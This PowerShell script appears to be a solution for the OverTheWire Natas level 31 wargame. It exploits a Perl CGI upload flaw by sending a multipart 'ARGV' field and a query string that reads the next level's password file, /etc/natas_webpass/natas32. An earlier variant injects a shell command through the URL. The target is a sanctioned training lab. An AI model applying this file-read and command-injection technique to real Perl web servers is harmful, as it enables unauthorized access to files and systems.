using namespace Microsoft.PowerShell.Utility

$server = "natas31.natas.labs.overthewire.org/"
#$server = "localhost:8000"
$url = "http://$server"

$username = "natas31"
$password = "***REMOVED***"

$pair = "${username}:${password}"
$bytes = [System.Text.Encoding]::ASCII.GetBytes($pair)
$base64 = [System.Convert]::ToBase64String($bytes)
$authorization = "Basic $base64"

$boundary = [System.Guid]::NewGuid().ToString()

$headers = @{
    "Authorization" = $authorization
    "Content-Type"  = "multipart/form-data; boundary=$boundary"
}

#look: https://www.blackhat.com/docs/asia-16/materials/asia-16-Rubin-The-Perl-Jam-2-The-Camel-Strikes-Back.pdf

$filePath = 'data.csv'
$fileItem = Get-Item -Path $filePath


$body = "--$boundary`r`n"
$body += "Content-Disposition: form-data; name=`"file`"`r`n`r`n"
$body += "ARGV"
$body += "`r`n" 
$body += "--$boundary`r`n"
$body += "Content-Disposition: form-data; name=`"file`"; filename=`"$($fileItem.Name)`"`r`n"
$body += "Content-Type: $($fileItem.Extension)`r`n`r`n"
$body += Get-Content -Path $fileItem.FullName -Raw
$body += "`r`n"
$body += "--$boundary--`r`n"

$body

$pwfile = "/etc/natas_webpass/natas32"

$extraParam = '?echo $(cat index.pl)|' 
$extraParam = "?$pwfile index.pl"
$response = Invoke-WebRequest -Headers $headers -URI ($url + $extraParam) -Method Post -Body $body
$response.Content

write-host `n$extraParam`n

if ($response.Content -like '*><th>*') {
    write-host `n"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAH"`n
}